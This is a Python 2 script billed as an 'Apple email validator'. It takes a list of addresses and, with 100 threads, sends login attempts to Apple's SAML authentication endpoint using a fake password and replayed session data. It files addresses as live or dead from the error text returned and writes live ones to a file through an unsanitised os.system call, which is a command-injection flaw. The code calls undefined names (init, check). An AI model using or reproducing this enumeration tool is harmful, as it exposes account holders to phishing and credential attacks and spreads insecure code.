live =0
dead =0
def asyncProcess(line):
	global live
	global dead
	line = line.rstrip()
	email = line.replace("@","%40")
	headers = {
	    'Host': 'idmsac.apple.com',
	    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	    'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
	    'Accept-Encoding': 'gzip, deflate',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Content-Length': '2534',
	    'Origin': 'https://idmsac.apple.com',
	    'Connection': 'close',
	    'Referer': 'https://idmsac.apple.com/IDMSWebAuth/SAMLLogin',
	    'Upgrade-Insecure-Requests': '1',
	}

	data = 'openiForgotInNewWindow=true&fdcBrowserData=%7B%22U%22%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_14_5%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F76.0.3809.36+Safari%2F537.36%22%2C%22L%22%3A%22id%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%227Oa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflFflczl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWocATPTgEQC7EPm8LKfAaZ4p37H01yjaY2.rINj.rINYOKES5fuyPB94UXuGlfUm7qKFz0Xnj3wMvsD7z5meTuCUMz_WMXWMYGzXJJIneGffLMC7EZ3QHPBirTYKUowRslzRQqwSM2dFLwoxNTqPFTpZHgfLMC7AvIfuyPBDovJn_JnmccbguaDeyjaY2ftckuyPBDjaY1HGOg3ZLQ0IHmeWuxX_J34tQmb.DJhCuXtdIa3CmeugSKclrKpjV1dY.4I1Y64JRcWqxQaZpaLuVr9fel9dCq485BNlYiMgBNlYCa1nkBMfs.2Ri%22%7D&appleId='+email+'&accountPassword=asdasd&accNameLocked=false&language=US-EN&requestUri=%2FSAMLLogin&Env=PROD&appIdKey=Wintergreen&SAMLRequest=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2FtbDJwOkF1dGhuUmVxdWVz%0D%0AdCB4bWxuczpzYW1sMnA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCIgQXNz%0D%0AZXJ0aW9uQ29uc3VtZXJTZXJ2aWNlVVJMPSJodHRwczovL2ZpbmFuemllcmVuLmNvbnNvcnNmaW5h%0D%0AbnouZGUvYy9wb3J0YWwvc2FtbC9hY3MiIERlc3RpbmF0aW9uPSJodHRwczovL2lkbXNhYy5hcHBs%0D%0AZS5jb20vSURNU1dlYkF1dGgvU0FNTExvZ2luIiBGb3JjZUF1dGhuPSJmYWxzZSIgSUQ9Il8wOGE2%0D%0AMzBiMzIwNjE2MGUwOGUwYjIxZGQ4NmYxZmJmNzk0MGQzOThmIiBJc1Bhc3NpdmU9ImZhbHNlIiBJ%0D%0Ac3N1ZUluc3RhbnQ9IjIwMTktMTItMjRUMTc6MzQ6MzEuMTkwWiIgUHJvdG9jb2xCaW5kaW5nPSJ1%0D%0Acm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YmluZGluZ3M6SFRUUC1QT1NUIiBWZXJzaW9uPSIy%0D%0ALjAiPjxzYW1sMjpJc3N1ZXIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIu%0D%0AMDphc3NlcnRpb24iPldpbnRlcmdyZWVuPC9zYW1sMjpJc3N1ZXI%2BPHNhbWwycDpOYW1lSURQb2xp%0D%0AY3kgQWxsb3dDcmVhdGU9InRydWUiIEZvcm1hdD0iUGVyc2lzdGVudCIvPjwvc2FtbDJwOkF1dGhu%0D%0AUmVxdWVzdD4%3D&RelayState=%2Fc&scnt=46e12cf74856350f2ad7c26544313e36&clientInfo=%7B%22U%22%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_14_5%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F76.0.3809.36+Safari%2F537.36%22%2C%22L%22%3A%22id%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22sGa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflFflczl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWocATPTgEQC7EPm8LKfAaZ4p37H01yjaY2.rINj.rINYOKES5fuyPB94UXuGlfUm7qKFz0Xnj3wMvsD7z5meTuCUMz_WMXWMYGzXJJIneGffLMC7EZ3QHPBirTYKUowRslzRQqwSM2dFLwoxNTqPFTpZHgfLMC7AvIfuyPBDovJn_JnmccbguaDeyjaY2ftckuyPBDjaY1HGOg3ZLQ0IHmeWuxX_JOXLwdk2_AITciPJtW2Reif6KPBSmrk0JlV1dWGYXeDJFvThnHPnASFQ_KpN_Jav1ZY5BNlrAq5BNlan0Os5Apw.3Xw%22%7D'

	r = requests.post('https://idmsac.apple.com/IDMSWebAuth/authenticate', headers=headers, data=data)
	if "403 Forbidden" in r.content:
		print "UNKOWN => "+line
	elif "Access denied. Your account does not have permission to access this application." in r.content or "has been locked" in r.content:
		print "LIVE => "+line
		payload = "echo "+line+" >> live.txt"
		os.system(payload)
	elif "password was entered incorrectly." in r.content:
		print "DEAD => "+line
	elif "502 Bad Gateway" in r.content:
		check(email)
	else:
		print "ERROR DETECTED"
		f = open("log.html","w+")
		f.write(r.content)
		exit()
		
from multiprocessing.pool import ThreadPool
import random, time, timeit
import requests
import json
import os
import sys
import time
init(convert=True)
os.system("clear")
print  '''     _________
    / ======= \			
   / __________\           APPLE 
  | ___________ |     EMAIL VALIDATOR
  | | -       | |
  | |         | |
  | |_________| |________________________
  \=____________/      Hilmi Azizi       )
  / """"""""""" \                       /
 / ::::::::::::: \                  =D-'
(_________________)\n'''
start_time = timeit.default_timer()

res =  1
if(res):
	try:
		thread_count = 100
		thread_pool = ThreadPool(processes=thread_count)
		known_threads = {}

		for i in open(sys.argv[1],"r"):
		    known_threads[i] = thread_pool.apply_async(asyncProcess, args=(i.rstrip(),))

		thread_pool.close()
		thread_pool.join()
		print("Finished in %s seconds" % str(timeit.default_timer() - start_time))
	except KeyboardInterrupt:
		print "Waiting for thread exit..."

else:
    print "Server not authenticated, Aborting..."
    exit()